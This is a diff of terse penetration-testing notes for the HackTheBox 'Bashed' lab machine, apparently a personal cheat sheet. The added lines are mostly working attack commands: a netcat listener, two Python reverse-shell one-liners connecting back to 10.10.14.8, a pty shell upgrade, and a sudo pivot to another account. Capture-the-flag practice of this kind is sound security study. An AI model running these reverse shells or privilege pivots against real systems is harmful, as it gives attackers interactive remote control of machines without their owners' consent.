@@ -60,12 +60,14 @@ SUID - /usr/bin/pandora_backup
 # Lin-Bashed
 https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
 ```
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
-/dev/phpbash.php
-reverse shell - python
-python3 -c "import pty;pty.spawn('/bin/bash')"
+http://10.10.10.68/dev/phpbash.php
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
+nc -nlvp 1234
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 sudo -l
+python3 -c "import pty;pty.spawn('/bin/bash')"
 sudo -u scriptmanager bash -i
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 python -c shell.py
 ```
 
